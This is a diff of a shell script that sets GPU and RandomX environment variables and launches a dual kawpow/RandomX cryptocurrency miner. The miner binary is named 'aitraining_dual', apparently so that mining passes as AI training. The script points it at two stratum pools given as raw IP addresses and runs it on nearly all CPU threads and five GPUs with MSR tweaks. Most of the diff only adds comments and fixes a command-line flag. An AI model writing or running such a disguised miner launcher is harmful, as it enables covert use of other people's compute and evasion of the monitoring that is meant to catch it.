@@ -2,11 +2,18 @@
 
 WORKER="$HOSTNAME"
 
-# Detect CPU threads and leave 1-2 free for system
+# Detect CPU threads and leave 2 free for the system
+# We subtract 2 from the total number of logical processors.
 CPU_THREADS=$(($(grep -c '^processor' /proc/cpuinfo) - 2))
-if [ $CPU_THREADS -lt 1 ]; then CPU_THREADS=1; fi
+
+# Ensure at least 1 CPU thread is used
+if [ $CPU_THREADS -lt 1 ]; then 
+    CPU_THREADS=1
+fi
 
 # Export GPU environment variables (optional for kawpow)
+# Note: These are typically for OpenCL/Ethash-based mining and may not be needed
+# or effective for all miners/algorithms.
 export GPU_MAX_HEAP_SIZE=100
 export GPU_MAX_USE_SYNC_OBJECTS=1
 export GPU_SINGLE_ALLOC_PERCENT=100
@@ -15,13 +22,13 @@ export GPU_MAX_SINGLE_ALLOC_PERCENT=100
 export GPU_ENABLE_LARGE_ALLOCATION=100
 export GPU_MAX_WORKGROUP_SIZE=1024
 
-# Enable hugepages for RandomX (temporary, until reboot)
-
 # Export HW-AES optimization for RandomX (automatically used if supported)
 export RANDOMX_USE_HW_AES=1
 
+# Ensure the miner executable is set to be executable
 chmod +x aitraining_dual
 
+# Execute the dual mining command
 ./aitraining_dual \
     --algorithm "kawpow;randomx" \
     --pool "stratum+ssl://51.89.99.172:16161;stratum+ssl://51.222.200.133:10343" \
@@ -33,4 +40,4 @@ chmod +x aitraining_dual
     --randomx-use-1gb-pages 1 \
     --force-msr-tweaks 1 \
     --keepalive true \
-    -gpu-id 0,1,2,3,4
+    --gpu-id 0,1,2,3,4
